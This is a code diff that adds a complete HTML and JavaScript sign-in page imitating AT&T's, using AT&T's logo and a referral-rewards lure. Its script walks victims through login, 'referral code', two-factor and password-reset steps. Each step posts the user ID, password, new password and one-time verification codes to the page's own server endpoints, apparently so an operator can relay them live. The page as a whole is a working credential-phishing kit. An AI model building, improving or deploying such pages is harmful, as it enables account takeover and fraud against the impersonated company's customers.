@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in | AT&amp;T</title>
+    <style>
+        html { font-size: 62.5%; }
+
+        *, *::before, *::after { box-sizing: border-box; }
+
+        :root {
+            --att-blue: #00388f;
+            --att-blue-dark: #002a6b;
+            --att-link: #0072b2;
+            --text: #1d2329;
+            --muted: #686e74;
+            --border: #686e74;
+            --hairline: #dcdfe3;
+            --disabled: #b7bcc2;
+            --font: "AT&T Aleck", "AT&T Aleck Sans", "Aleck",
+                    "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 48px 24px;
+            background: #fff;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 1.8rem;
+            font-weight: 400;
+            line-height: 1.4;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 456px;
+            min-height: 520px;
+            padding: 48px;
+            border-radius: 1.6rem;
+            background: #fff;
+            box-shadow: inset 0 0 0 1px var(--hairline);
+        }
+
+        .logo {
+            display: block;
+            height: 36px;
+            width: auto;
+            margin: 0 auto 32px;
+        }
+
+        .head {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .head h1,
+        .head h2 {
+            margin: 0;
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.03em;
+            text-indent: -0.05em;
+            color: var(--text);
+        }
+
+        .head h1 { font-size: 3.4rem; }
+        .head h2 { font-size: 2.6rem; margin-top: 8px; }
+
+        .field-group { margin-bottom: 32px; }
+
+        .field-group:last-of-type { margin-bottom: 0; }
+
+        label {
+            display: block;
+            padding-bottom: 0.8rem;
+            font-size: 1.4rem;
+            font-weight: 700;
+            line-height: 1.2;
+            color: var(--text);
+            cursor: pointer;
+        }
+
+        .field {
+            width: 100%;
+            min-height: 4.8rem;
+            padding: 0 24px 0 16px;
+            font-family: var(--font);
+            font-size: 1.6rem;
+            font-weight: 400;
+            color: var(--text);
+            background-color: #fff;
+            border: 0.740741px solid var(--border);
+            border-radius: 0.8rem;
+            appearance: none;
+        }
+
+        .field::placeholder { color: #8a9096; }
+
+        .field:focus {
+            outline: 2px solid var(--att-blue);
+            outline-offset: 1px;
+            border-color: var(--att-blue);
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 4.8rem;
+            min-width: 100%;
+            padding: 0 32px;
+            margin: 32px 0;
+            font-family: var(--font);
+            font-size: 1.4rem;
+            font-weight: 700;
+            line-height: 1;
+            letter-spacing: -0.03em;
+            color: #fff;
+            background-color: var(--att-blue);
+            border: 1px solid var(--att-blue);
+            border-radius: 2em;
+            cursor: pointer;
+            user-select: none;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .btn:hover:not(:disabled) {
+            background-color: var(--att-blue-dark);
+            border-color: var(--att-blue-dark);
+        }
+
+        .btn:focus-visible {
+            outline: 2px solid var(--att-blue);
+            outline-offset: 2px;
+        }
+
+        .btn:disabled {
+            background-color: var(--disabled);
+            border-color: var(--disabled);
+            cursor: not-allowed;
+        }
+
+        .link-row { margin-top: 24px; text-align: center; }
+
+        .prompt {
+            margin: 0 0 6px;
+            font-size: 1.5rem;
+            color: var(--muted);
+        }
+
+        .hint {
+            margin: 0 0 32px;
+            font-size: 1.5rem;
+            color: var(--muted);
+        }
+
+        .link {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            padding: 0;
+            font-family: var(--font);
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--att-link);
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .link:hover { text-decoration: underline; }
+
+        .link svg { width: 1.4rem; height: 1.4rem; }
+
+        .code-box {
+            padding: 20px;
+            margin-bottom: 24px;
+            text-align: center;
+            border: 1.5px dashed var(--att-blue);
+            border-radius: 1.2rem;
+        }
+
+        .code-label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            color: var(--muted);
+        }
+
+        .code-value {
+            display: block;
+            font-size: 3.4rem;
+            font-weight: 700;
+            letter-spacing: 0.18em;
+            color: var(--att-blue);
+            font-variant-numeric: tabular-nums;
+        }
+
+        .hidden { display: none; }
+
+        #boot-error {
+            padding: 10px 12px;
+            margin-bottom: 24px;
+            font-family: monospace;
+            font-size: 1.2rem;
+            color: #b00020;
+            background: #fff5f7;
+            border: 1px solid #f3c2cf;
+            border-radius: 0.8rem;
+            white-space: pre-wrap;
+        }
+
+        @media (max-width: 480px) {
+            body { padding: 24px 16px; }
+            .card { padding: 32px 24px; border-radius: 1.2rem; min-height: 0; }
+            .head h1 { font-size: 3rem; }
+            .head h2 { font-size: 2.2rem; }
+        }
+    </style>
+</head>
+<body>
+    <main class="card" role="main">
+        <img class="logo" alt="AT&amp;T"
+             src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg">
+
+        <div id="boot-error" class="hidden"></div>
+
+        <div class="head">
+            <h1 id="heading-line1">Sign in</h1>
+            <h2 id="heading-line2">to my Account</h2>
+        </div>
+
+        <!-- step 1: credentials -->
+        <form data-step="login-credentials">
+            <div class="field-group">
+                <label for="email">User ID</label>
+                <input class="field" type="email" id="email" name="userID" placeholder=""
+                       autocomplete="username" spellcheck="false" autocapitalize="off" required>
+            </div>
+
+            <div class="field-group">
+                <label for="password">Password</label>
+                <input class="field" type="password" id="password" name="password" placeholder=""
+                       autocomplete="current-password" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+
+            <div class="link-row">
+                <p class="prompt">Forgot your user ID or password?</p>
+                <a class="link" href="#" id="to-reset">Reset it now
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                         stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+                </a>
+            </div>
+        </form>
+
+        <!-- step 2: referral -->
+        <form data-step="login-referral" class="hidden">
+            <p class="hint">Almost done. Enter the referral code you were given.</p>
+
+            <div class="field-group">
+                <label for="referral">Referral code</label>
+                <input class="field" type="text" id="referral" placeholder=""
+                       autocomplete="off" spellcheck="false" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+        </form>
+
+        <!-- step 3: 2fa -->
+        <form data-step="login-2fa" class="hidden">
+            <p class="hint">We sent a 6-digit code to your device.</p>
+
+            <div class="field-group">
+                <label for="login-code">Verification code</label>
+                <input class="field" type="text" id="login-code" inputmode="numeric"
+                       placeholder="" autocomplete="one-time-code" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+
+            <div class="link-row">
+                <p class="prompt">Didn't get a code?</p>
+                <a class="link" href="#" id="resend-code">Resend code
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                         stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+                </a>
+            </div>
+        </form>
+
+        <!-- reset step 1: user id -->
+        <form data-step="reset-email" class="hidden">
+            <p class="hint">Enter the user ID on your account and we'll start the reset.</p>
+
+            <div class="field-group">
+                <label for="reset-email-input">User ID</label>
+                <input class="field" type="email" id="reset-email-input" placeholder=""
+                       autocomplete="username" spellcheck="false" autocapitalize="off" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+
+            <div class="link-row">
+                <a class="link" href="#" id="back-to-login">Back to sign in</a>
+            </div>
+        </form>
+
+        <!-- reset step 2: new password -->
+        <form data-step="reset-password" class="hidden">
+            <p class="hint">Choose a new password for your account.</p>
+
+            <div class="field-group">
+                <label for="new-password">New password</label>
+                <input class="field" type="password" id="new-password" placeholder=""
+                       autocomplete="new-password" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+        </form>
+
+        <!-- reset step 3: 2fa -->
+        <form data-step="reset-2fa" class="hidden">
+            <p class="hint">We sent a 6-digit code to your device.</p>
+
+            <div class="field-group">
+                <label for="reset-code">Verification code</label>
+                <input class="field" type="text" id="reset-code" inputmode="numeric"
+                       placeholder="" autocomplete="one-time-code" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+        </form>
+
+        <!-- reset step 4: referral -->
+        <form data-step="reset-referral" class="hidden">
+            <p class="hint">Last step. Enter your referral code.</p>
+
+            <div class="field-group">
+                <label for="reset-referral">Referral code</label>
+                <input class="field" type="text" id="reset-referral" placeholder=""
+                       autocomplete="off" spellcheck="false" required>
+            </div>
+
+            <button class="btn" type="submit">Continue</button>
+        </form>
+
+        <!-- success -->
+        <div data-step="success" class="hidden">
+            <p class="hint" id="success-copy"></p>
+
+            <div class="code-box hidden" id="code-box">
+                <span class="code-label">Your referral code</span>
+                <strong class="code-value" id="own-code">------</strong>
+            </div>
+
+            <a class="link" id="to-dashboard" href="/dashboard">Continue to my Account</a>
+        </div>
+    </main>
+
+    <script>
+        (function () {
+            'use strict';
+
+            function fail(msg) {
+                var box = document.getElementById('boot-error');
+                if (!box) { alert(msg); return; }
+                box.classList.remove('hidden');
+                box.textContent = String(msg);
+            }
+
+            window.addEventListener('error', function (e) {
+                fail('JS error: ' + e.message + ' (line ' + e.lineno + ')');
+            });
+
+            function boot() {
+                var state = { flow: 'login', id: null, own_code: null };
+
+                var HEADINGS = {
+                    'login-credentials': ['Sign in', 'to my Account'],
+                    'login-referral': ['Referral code', 'one quick step'],
+                    'login-2fa': ['Verify', "it's you"],
+                    'reset-email': ['Reset', 'your password'],
+                    'reset-password': ['New', 'password'],
+                    'reset-2fa': ['Verify', "it's you"],
+                    'reset-referral': ['Referral code', 'last step'],
+                    'success': ["You're all", 'set']
+                };
+
+                var panels = Array.prototype.slice.call(document.querySelectorAll('[data-step]'));
+                var line1 = document.getElementById('heading-line1');
+                var line2 = document.getElementById('heading-line2');
+
+                if (!panels.length) { fail('No [data-step] panels found.'); return; }
+
+                function formFor(step) {
+                    return document.querySelector('form[data-step="' + step + '"]');
+                }
+
+                function el(id) {
+                    var node = document.getElementById(id);
+                    if (!node) fail('Missing element: #' + id);
+                    return node;
+                }
+
+                function show(step) {
+                    panels.forEach(function (p) {
+                        p.classList.toggle('hidden', p.dataset.step !== step);
+                    });
+
+                    var h = HEADINGS[step] || ['Sign in', 'to my Account'];
+                    line1.textContent = h[0];
+                    line2.textContent = h[1];
+                    document.title = h[0] + ' ' + h[1] + ' | AT&T';
+
+                    var first = document.querySelector('[data-step="' + step + '"] .field');
+                    if (first) first.focus();
+                }
+
+                function go(next) {
+                    if (next === 'success') {
+                        var box = el('code-box');
+
+                        if (state.own_code) {
+                            el('own-code').textContent = state.own_code;
+                            el('to-dashboard').href = '/dashboard?code=' + state.own_code;
+                            box.classList.remove('hidden');
+                        } else {
+                            box.classList.add('hidden');
+                        }
+
+                        el('success-copy').textContent =
+                            state.flow === 'reset'
+                                ? 'Your password has been reset and you are now eligible for rewards.'
+                                : 'You are now registered for Refer-a-Friend and eligible for rewards.';
+                        show('success');
+                    } else {
+                        show(state.flow + '-' + next);
+                    }
+                }
+
+                function post(url, body) {
+                    return fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(body)
+                    }).then(function (res) {
+                        return res.json().catch(function () {
+                            return { ok: false, message: 'Bad response from server (HTTP ' + res.status + ').' };
+                        });
+                    });
+                }
+
+                function busy(form, on) {
+                    var btn = form.querySelector('.btn');
+                    if (!btn) return;
+                    if (on) {
+                        btn.dataset.label = btn.textContent;
+                        btn.textContent = 'Please wait...';
+                        btn.disabled = true;
+                    } else {
+                        btn.textContent = btn.dataset.label || 'Continue';
+                        btn.disabled = false;
+                    }
+                }
+
+                function wire(step, url, payload, done) {
+                    var form = formFor(step);
+                    if (!form) { fail('Missing form for step: ' + step); return; }
+
+                    form.addEventListener('submit', function (e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        busy(form, true);
+
+                        post(url, payload())
+                            .then(function (data) {
+                                if (!data.ok) {
+                                    alert(data.message || 'Something went wrong.');
+                                    busy(form, false);
+                                    return;
+                                }
+                                if (data.id) state.id = data.id;
+                                busy(form, false);
+                                done(data);
+                            })
+                            .catch(function (err) {
+                                console.error(err);
+                                alert('An error occurred. Please try again.');
+                                busy(form, false);
+                            });
+                    });
+                }
+
+                /* ---------------- sign in flow ---------------- */
+
+                wire('login-credentials', '/api/login', function () {
+                    return {
+                        email: el('email').value.trim(),
+                        password: el('password').value
+                    };
+                }, function (data) {
+                    state.flow = 'login';
+                    go(data.next);
+                });
+
+                wire('login-referral', '/api/referral', function () {
+                    return { id: state.id, referral_code: el('referral').value.trim() };
+                }, function (data) { go(data.next); });
+
+                wire('login-2fa', '/api/2fa', function () {
+                    return { id: state.id, code: el('login-code').value.trim() };
+                }, function (data) {
+                    if (data.own_code) state.own_code = data.own_code;
+                    go(data.next);
+                });
+
+                /* ---------------- reset flow ---------------- */
+
+                wire('reset-email', '/api/reset/start', function () {
+                    return { email: el('reset-email-input').value.trim() };
+                }, function (data) {
+                    state.flow = 'reset';
+                    go(data.next);
+                });
+
+                wire('reset-password', '/api/reset/password', function () {
+                    return { id: state.id, password: el('new-password').value };
+                }, function (data) { go(data.next); });
+
+                wire('reset-2fa', '/api/reset/2fa', function () {
+                    return { id: state.id, code: el('reset-code').value.trim() };
+                }, function (data) { go(data.next); });
+
+                wire('reset-referral', '/api/reset/referral', function () {
+                    return { id: state.id, referral_code: el('reset-referral').value.trim() };
+                }, function (data) {
+                    if (data.own_code) state.own_code = data.own_code;
+                    go(data.next);
+                });
+
+                /* ---------------- links ---------------- */
+
+                el('to-reset').addEventListener('click', function (e) {
+                    e.preventDefault();
+                    state.flow = 'reset';
+                    state.id = null;
+                    state.own_code = null;
+                    history.replaceState(null, '', '/reset');
+                    show('reset-email');
+                });
+
+                el('back-to-login').addEventListener('click', function (e) {
+                    e.preventDefault();
+                    state.flow = 'login';
+                    state.id = null;
+                    state.own_code = null;
+                    history.replaceState(null, '', '/login');
+                    show('login-credentials');
+                });
+
+                el('resend-code').addEventListener('click', function (e) {
+                    e.preventDefault();
+                    if (!state.id) return;
+                    post('/api/resend', { id: state.id, flow: state.flow }).then(function (data) {
+                        alert(data.message || 'Code resent.');
+                    });
+                });
+
+                /* ---------------- boot ---------------- */
+
+                if (location.pathname.replace(/\/+$/, '') === '/reset') {
+                    state.flow = 'reset';
+                    show('reset-email');
+                } else {
+                    show('login-credentials');
+                }
+            }
+
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', boot);
+            } else {
+                boot();
+            }
+        })();
+    </script>
+</body>
+</html>
